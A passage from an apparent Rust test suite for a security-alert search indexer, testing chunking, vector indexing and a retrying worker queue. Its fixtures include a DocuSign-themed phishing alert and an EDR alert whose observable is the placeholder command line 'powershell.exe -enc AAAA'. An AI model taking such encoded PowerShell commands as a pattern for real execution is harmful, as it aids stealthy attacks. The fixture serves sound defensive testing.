    assert!(capped.documents.iter().all(|d| d.text.len() <= 1024));
    let root = insert_alert(db, "a long text", "phish", "default", 7).await;
    let image = insert_added_file(db, bucket, root, None, "big.png", b"png bytes 3", &[]).await;
    insert_result(
        db,
        root,
        image,
        "qr_code_analysis",
        json!({"extracted_text": "é".repeat(1500)}),
    )
    .await;
    let capped = t
        .documents(
            root,
            &Bounds {
                max_document_bytes: 1025,
                ..Bounds::default()
            },
        )
        .await;
    let document = capped
        .documents
        .iter()
        .find(|d| d.kind == "analysis")
        .expect("the text");
    assert_eq!(document.text.len(), 1024, "cut before the half character");
    // test_large_details_are_not_loaded: details over the bound are skipped where they are stored. The
    // bound is on their stored size, so the text is one that doesn't compress
    let root = insert_alert(db, "large details", "phish", "default", 8).await;
    let image = insert_added_file(db, bucket, root, None, "huge.png", b"png bytes 4", &[]).await;
    let noise: String = (0..40_000u32)
        .map(|n| char::from(b'a' + (n.wrapping_mul(2_654_435_761) >> 24) as u8 % 26))
        .collect();
    insert_result(
        db,
        root,
        image,
        "qr_code_analysis",
        json!({"extracted_text": noise}),
    )
    .await;
    let small = t
        .documents(
            root,
            &Bounds {
                max_document_bytes: 2048,
                ..Bounds::default()
            },
        )
        .await;
    assert!(small.documents.iter().all(|d| d.kind != "analysis"));
    assert!(
        t.documents(root, &bounds)
            .await
            .documents
            .iter()
            .any(|d| d.kind == "analysis")
    );
    // an alert's documents are bounded, and what is past the bound is counted
    let root = insert_alert(db, "many results", "phish", "default", 9).await;
    for n in 0..6 {
        let file = insert_added_file(
            db,
            bucket,
            root,
            None,
            &format!("qr{n}.png"),
            format!("many {n}").as_bytes(),
            &[],
        )
        .await;
        insert_result(
            db,
            root,
            file,
            "qr_code_analysis",
            json!({"extracted_text": format!("text {n}")}),
        )
        .await;
    }
    let bounded = t
        .documents(
            root,
            &Bounds {
                max_documents: 4,
                ..Bounds::default()
            },
        )
        .await;
    assert_eq!((bounded.documents.len(), bounded.left_out), (4, 3));

    // a root that isn't an alert, or isn't there, has no documents: test_missing_alert_is_skipped
    sqlx::query("UPDATE analysis.roots SET alerted_at = NULL WHERE id = $1")
        .bind(root)
        .execute(db.pool())
        .await
        .expect("unalerted");
    for gone in [root, Uuid::new_v4()] {
        let extracted = t.documents(gone, &bounds).await;
        assert_eq!(
            (extracted.documents.len(), extracted.skipped.as_deref()),
            (0, Some("alert not found"))
        );
    }
}

/// ace3's `test_index.py`: `TestPointId`, `TestBuildPoints`, `TestWritePoints` and `TestIndexAlert`. Its
/// `TestCollection`, `TestEnsureCollectionRace` and `TestPayloadUpdates` are Qdrant's collection and
/// payload, which the Postgres index has none of: the table is a migration's, and a filter reads the
/// alert's own row.
#[tokio::test(flavor = "multi_thread")]
async fn index_cases() {
    use crate::documents::Bounds;
    use crate::qdrant::point_id;

    // TestPointId: test_deterministic_and_node_independent, test_varies_with_every_component
    let root = Uuid::from_u128(0x1234);
    assert_eq!(
        point_id(root, "alert", "header", 0),
        point_id(root, "alert", "header", 0)
    );
    let other = [
        point_id(Uuid::from_u128(0x1235), "alert", "header", 0),
        point_id(root, "comment", "header", 0),
        point_id(root, "alert", "other", 0),
        point_id(root, "alert", "header", 1),
    ];
    assert!(
        other
            .iter()
            .all(|id| *id != point_id(root, "alert", "header", 0))
    );
    // ace3's own value for the same alert: uuid5(root, "alert:header:0")
    assert_eq!(
        point_id(root, "alert", "header", 0),
        Uuid::new_v5(&root, b"alert:header:0")
    );

    let t = tree().await;
    let (db, bucket) = (&t.db, &t.bucket);
    let root = insert_alert(
        db,
        "Suspicious email - DocuSign invoice",
        "phish",
        "default",
        1,
    )
    .await;
    email(
        db,
        bucket,
        root,
        "billing@docusign-invoices.example",
        "bob@example.com",
        "Your DocuSign invoice is ready",
        "Please review and sign the attached invoice.",
    )
    .await;
    let address = insert_observable(db, root, "ipv4", "10.20.30.40", &[]).await;
    insert_detection(db, root, address, "a suspicious sender").await;

    // test_payload_and_vectors: each chunk with its text, its title, where it came from, an embedding of
    // the model's size at unit length, and its terms
    let indexed = t.pg.index_alert(root, &[]).await.expect("indexed");
    assert_eq!(
        (
            indexed.documents,
            indexed.chunks,
            indexed.left_out,
            &indexed.skipped,
            &indexed.error
        ),
        (3, 3, 0, &None, &None)
    );
    let rows = t.chunk_rows(root).await;
    assert_eq!(
        rows.iter().map(|row| row.0.as_str()).collect::<Vec<_>>(),
        vec!["alert", "analysis", "detection"]
    );
    assert!(
        rows[1]
            .3
            .starts_with("Your DocuSign invoice is ready\nFrom: billing@"),
        "an email's subject is embedded: {}",
        rows[1].3
    );
    assert!(
        rows[0]
            .3
            .starts_with("Suspicious email - DocuSign invoice\nalert type: phish"),
        "{}",
        rows[0].3
    );
    assert_eq!(rows[2].3, "a suspicious sender", "a label isn't embedded");
    let (dimensions, norm, lexemes, title, result): (i32, f64, i32, Option<String>, Option<i64>) =
        sqlx::query_as(
            "SELECT vector_dims(embedding), vector_norm(embedding), length(terms), title, result_id
         FROM search.chunks WHERE root_id = $1 AND kind = 'analysis'",
        )
        .bind(root)
        .fetch_one(db.pool())
        .await
        .expect("read");
    assert_eq!(dimensions, 384);
    assert!((norm - 1.0).abs() < 1e-4);
    assert!(lexemes > 10);
    assert_eq!(title.as_deref(), Some("Your DocuSign invoice is ready"));
    assert!(result.is_some());
    let stored: (i32, i32, i32, String) = sqlx::query_as(
        "SELECT documents, chunks, left_out, model FROM search.indexed WHERE root_id = $1",
    )
    .bind(root)
    .fetch_one(db.pool())
    .await
    .expect("read");
    assert_eq!(stored, (3, 3, 0, "all-MiniLM-L6-v2".to_owned()));

    // indexing again writes the same rows
    let again = t.pg.index_alert(root, &[]).await.expect("indexed");
    assert_eq!(again.chunks, 3);
    assert_eq!(t.chunk_rows(root).await, rows);
    // test_upsert_before_delete_of_stale_points: a document the alert no longer has goes, and one that
    // changed is replaced
    sqlx::query("DELETE FROM analysis.detections WHERE root_id = $1")
        .bind(root)
        .execute(db.pool())
        .await
        .expect("deleted");
    sqlx::query("UPDATE analysis.roots SET description = 'Renamed' WHERE id = $1")
        .bind(root)
        .execute(db.pool())
        .await
        .expect("renamed");
    let comment = Document::comment("1", Some("alice"), "confirmed phish").expect("a comment");
    let changed =
        t.pg.index_alert(root, std::slice::from_ref(&comment))
            .await
            .expect("indexed");
    assert_eq!(changed.chunks, 3);
    let rows = t.chunk_rows(root).await;
    assert_eq!(
        rows.iter().map(|row| row.0.as_str()).collect::<Vec<_>>(),
        vec!["alert", "analysis", "comment"]
    );
    assert!(rows[0].3.starts_with("Renamed\n"));
    assert_eq!(
        rows[2].3, "alice\nconfirmed phish",
        "a comment's author is its title"
    );

    // test_long_document_is_chunked, within the bounds, and what is past them is counted
    let long = insert_alert(db, "a long document", "phish", "default", 2).await;
    let image = insert_added_file(db, bucket, long, None, "long.png", b"long png", &[]).await;
    let text: String = (0..400).map(|n| format!("word{n} ")).collect();
    insert_result(
        db,
        long,
        image,
        "qr_code_analysis",
        json!({"extracted_text": text}),
    )
    .await;
    let tight = t.pg.clone().with_bounds(Bounds {
        chunk_tokens: 32,
        chunk_overlap: 8,
        max_chunks_per_document: 5,
        ..Bounds::default()
    });
    let indexed = tight.index_alert(long, &[]).await.expect("indexed");
    assert_eq!(
        (indexed.documents, indexed.chunks),
        (2, 6),
        "the header and five chunks of the text"
    );
    let rows = t.chunk_rows(long).await;
    let chunks: Vec<i32> = rows
        .iter()
        .filter(|row| row.0 == "analysis")
        .map(|row| row.2)
        .collect();
    assert_eq!(chunks, vec![0, 1, 2, 3, 4]);
    assert!(
        rows.iter()
            .filter(|row| row.0 == "analysis")
            .all(|row| !row.3.contains("QR code"))
    );
    let tighter = t.pg.clone().with_bounds(Bounds {
        chunk_tokens: 32,
        chunk_overlap: 8,
        max_chunks: 3,
        ..Bounds::default()
    });
    let indexed = tighter.index_alert(long, &[]).await.expect("indexed");
    assert_eq!(indexed.chunks, 3);
    assert!(indexed.left_out > 0);
    assert_eq!(
        t.chunk_rows(long).await.len(),
        3,
        "the chunks past the bound went"
    );

    // test_no_documents_no_points, test_empty_point_set_deletes_everything_for_the_alert,
    // test_missing_alert_is_skipped: a root that stops being an alert loses its chunks, and one that
    // isn't there is skipped
    sqlx::query("UPDATE analysis.roots SET alerted_at = NULL WHERE id = $1")
        .bind(long)
        .execute(db.pool())
        .await
        .expect("unalerted");
    let skipped = t.pg.index_alert(long, &[]).await.expect("indexed");
    assert_eq!(
        (skipped.chunks, skipped.skipped.as_deref()),
        (0, Some("alert not found"))
    );
    assert!(t.chunk_rows(long).await.is_empty());
    let missing =
        t.pg.index_alert(Uuid::new_v4(), &[])
            .await
            .expect("indexed");
    assert_eq!(
        (missing.chunks, missing.skipped.as_deref()),
        (0, Some("alert not found"))
    );
    // test_delete_alert_without_collection, and the root's deletion takes its chunks with it
    assert_eq!(t.pg.delete_alert(Uuid::new_v4()).await.expect("deleted"), 0);
    assert_eq!(t.pg.count().await.expect("counted"), 3);
    sqlx::query("DELETE FROM analysis.roots WHERE id = $1")
        .bind(root)
        .execute(db.pool())
        .await
        .expect("deleted");
    assert_eq!(t.pg.count().await.expect("counted"), 0);
}

/// The indexer's work: ace3's `test_worker_search_submit.py` and the task cases of `test_service.py`.
/// A completed pass leaves the alert due in the transaction that completes it, where ace3's worker
/// queues a task once its lock is released; the indexer takes it, indexes it and removes it; a failure
/// is tried three times and then left, ace3's dead letter; and a pass that completes while an alert is
/// being indexed leaves it due again. ace3's lock, its deferrals, its Redis list and its worker
/// processes have no counterpart: a due row is a row, and the indexer is a task of `ace serve`.
#[tokio::test(flavor = "multi_thread")]
async fn the_indexer_indexes_what_a_completed_pass_left_due() {
    use ace_core::queue;

    let t = tree().await;
    let db = &t.db;
    let due = || async {
        sqlx::query_as::<_, (Uuid, i64, i32, bool, Option<String>)>(
            "SELECT root_id, version, attempts, failed_at IS NOT NULL, error FROM search.due ORDER BY due_at, root_id",
        )
        .fetch_all(db.pool())
        .await
        .expect("read")
    };
    let complete = |root: Uuid| async move {
        let mut tx = db.begin().await.expect("begins");
        queue::begin_pass(&mut tx, root)
            .await
            .expect("begins a pass");
        let pass = queue::check_completion(&mut tx, root)
            .await
            .expect("completes");
        tx.commit().await.expect("commits");
        pass
    };
    assert!(due().await.is_empty());
    assert_eq!(
        t.pg.index_next().await.expect("asked"),
        None,
        "nothing is due"
    );

    // test_submit_happens_after_the_lock_is_released: the completion and the request are one transaction
    let alert = insert_alert(db, "EDR - encoded PowerShell download", "edr", "default", 1).await;
    let command =
        insert_observable(db, alert, "command_line", "powershell.exe -enc AAAA", &[]).await;
    insert_result(
        db,
        alert,
        command,
        "command_line_analysis",
        json!({"file_paths": []}),
    )
    .await;
    assert!(complete(alert).await.is_some());
    assert_eq!(due().await, vec![(alert, 1, 0, false, None)]);
    // test_no_submit_when_not_requested: a root that isn't an alert isn't indexed
    let plain = insert_alert(db, "not an alert", "edr", "default", 2).await;
    sqlx::query("UPDATE analysis.roots SET alerted_at = NULL WHERE id = $1")
        .bind(plain)
        .execute(db.pool())
        .await
        .expect("unalerted");
    assert!(complete(plain).await.is_some());
    assert_eq!(due().await.len(), 1);

    // test_index_task_logs_one_completion_line: what was done, and the row is gone
    let indexed =
        t.pg.index_next()
            .await
            .expect("indexed")
            .expect("one was due");
    assert_eq!(
        (
            indexed.root,
            indexed.documents,
            indexed.chunks,
            &indexed.error
        ),
        (alert, 2, 2, &None)
    );
    assert!(due().await.is_empty());
    assert_eq!(t.chunk_rows(alert).await.len(), 2);
    assert_eq!(t.pg.index_next().await.expect("asked"), None);

    // another pass asks again, and a request made while one waits is the same row, newer
    assert!(complete(alert).await.is_some());
    assert!(complete(alert).await.is_some());
    assert_eq!(due().await, vec![(alert, 2, 0, false, None)]);
    // a pass that completes while the alert is being indexed leaves it due: the indexer removes only
    // the request it took
    let taken: (Uuid, i64) = sqlx::query_as(
        "UPDATE search.due SET claimed_until = now() + interval '10 minutes' RETURNING root_id, version",
    )
    .fetch_one(db.pool())
    .await
    .expect("taken");
    assert_eq!(
        t.pg.index_next().await.expect("asked"),
        None,
        "another indexer has it"
    );
    assert!(complete(alert).await.is_some());
    let removed = sqlx::query("DELETE FROM search.due WHERE root_id = $1 AND version = $2")
        .bind(taken.0)
        .bind(taken.1)
        .execute(db.pool())
        .await
        .expect("settled")
        .rows_affected();
    assert_eq!(removed, 0, "the request it took was replaced");
    assert_eq!(due().await, vec![(alert, 3, 0, false, None)]);
    assert!(
        t.pg.index_next().await.expect("indexed").is_some(),
        "and the newer request is free to take"
    );
    assert!(due().await.is_empty());
    // a claim that lapsed, its indexer gone, is taken again
    assert!(complete(alert).await.is_some());
    sqlx::query("UPDATE search.due SET claimed_until = now() - interval '1 second'")
        .execute(db.pool())
        .await
        .expect("lapsed");
    assert!(t.pg.index_next().await.expect("indexed").is_some());

    // test_task_error_is_logged_and_requeued, test_requeue_dead_letters_at_cap: a failure is counted and
    // tried again, three times in all, and then left where it can be seen
    sqlx::raw_sql(
        "CREATE FUNCTION search.refuse() RETURNS trigger LANGUAGE plpgsql AS
             $$ BEGIN RAISE EXCEPTION 'the index refuses this chunk'; END $$;
         CREATE TRIGGER refuse BEFORE INSERT OR UPDATE ON search.chunks
             FOR EACH ROW EXECUTE FUNCTION search.refuse()",
    )
    .execute(db.pool())
    .await
    .expect("a failing index");
    assert!(complete(alert).await.is_some());
    for attempt in 1..=3 {
        // a failed try waits before the next; the test doesn't
        sqlx::query("UPDATE search.due SET due_at = now()")
            .execute(db.pool())
            .await
            .expect("due now");
        let failed =
            t.pg.index_next()
                .await
                .expect("asked")
                .expect("one was due");
        assert_eq!(failed.root, alert);
        assert!(
            failed
                .error
                .as_deref()
                .is_some_and(|error| error.contains("the index refuses this chunk")),
            "{failed:?}"
        );
        let rows = due().await;
        assert_eq!((rows[0].2, rows[0].3), (attempt, attempt == 3), "{rows:?}");
        assert!(
            rows[0]
                .4
                .as_deref()
                .is_some_and(|error| error.contains("refuses"))
        );
    }
    sqlx::query("UPDATE search.due SET due_at = now()")
        .execute(db.pool())
        .await
        .expect("due now");
    assert_eq!(
        t.pg.index_next().await.expect("asked"),
        None,
        "it isn't tried a fourth time"
    );
    assert_eq!(
        t.chunk_rows(alert).await.len(),
        2,
        "the chunks it had are still there"
    );
    // the next pass asks again from the start
    sqlx::raw_sql("DROP TRIGGER refuse ON search.chunks")
        .execute(db.pool())
        .await
        .expect("mended");
    assert!(complete(alert).await.is_some());
    assert_eq!(due().await[0].2, 0);
    assert!(
        t.pg.index_next()
            .await
            .expect("indexed")
            .expect("due")
            .error
            .is_none()
    );
    assert!(due().await.is_empty());

    // the service's worker does the same as the component that holds only search:index
    let service = Service::new(
        db.clone(),
        Orchestrator::new(Catalog::new(vec![]), Modes::ace3()),
    )
    .with_search(Arc::new(t.pg.clone()), SearchConfig::default());
    assert!(complete(alert).await.is_some());
    let stop = tokio_util::sync::CancellationToken::new();
    let worker = tokio::spawn(ace_service::search::run_worker(
        service,
        std::time::Duration::from_millis(50),
        stop.clone(),
    ));
    // Each wait only guards against a hang: an index is an embedding, which under coverage, with the
    // rest of this crate's tests embedding beside it, has taken over 30 seconds.
    let started = Instant::now();
    while !due().await.is_empty() {
        assert!(
            started.elapsed().as_secs() < 120,
            "the worker didn't index the alert"
        );
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }
    // and a completion wakes it
    assert!(complete(alert).await.is_some());
    let started = Instant::now();
    while !due().await.is_empty() {
        assert!(
            started.elapsed().as_secs() < 120,
            "the worker didn't wake for the completion"
        );
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }
    stop.cancel();
    tokio::time::timeout(std::time::Duration::from_secs(5), worker)
        .await
        .expect("it stops")
        .expect("it ran");
}

/// What the model costs a process (`docs/decisions/0002-search-index.md`): its resident memory before
/// and after the model loads and after it embeds, and how long each takes. A measurement, printed;
/// `tools/search/compare` runs it alone, so no other test's memory is in it.
#[test]
#[ignore = "a measurement: tools/search/compare runs it alone"]
fn model_cost() {
    fn resident_kib() -> u64 {
        std::fs::read_to_string("/proc/self/status")
            .ok()
            .and_then(|status| {
                status
                    .lines()
                    .find(|line| line.starts_with("VmRSS:"))
                    .and_then(|line| line.split_whitespace().nth(1)?.parse().ok())
            })
            .unwrap_or(0)
    }
    let before = resident_kib();
    let dir = std::env::var(MODEL_VAR).expect("the dev image sets it");
    let started = Instant::now();
    let model = Model::load(Path::new(&dir)).expect("loads");
    let load_ms = started.elapsed().as_secs_f64() * 1000.0;
    let loaded = resident_kib();
    let query = "docusign invoice phishing";
    let long: String = (0..400).map(|n| format!("word{n} ")).collect();
    let time = |text: &str| {
        let mut runs: Vec<f64> = (0..15)
            .map(|_| {
                let started = Instant::now();
                model.encode_one(text).expect("embedded");
                started.elapsed().as_secs_f64() * 1000.0
            })
            .collect();
        runs.sort_by(f64::total_cmp);
        runs[runs.len() / 2]
    };
    let (short_ms, long_ms) = (time(query), time(&long));
    let after = resident_kib();
    println!("model\tresident KiB\tbefore {before}\tloaded {loaded}\tafter embedding {after}");
    println!(
        "model\tload ms {load_ms:.0}\ta query's embedding, median of 15: {short_ms:.1} ms\ta 256-token chunk's: {long_ms:.1} ms"
    );
    assert!(loaded > before);
}
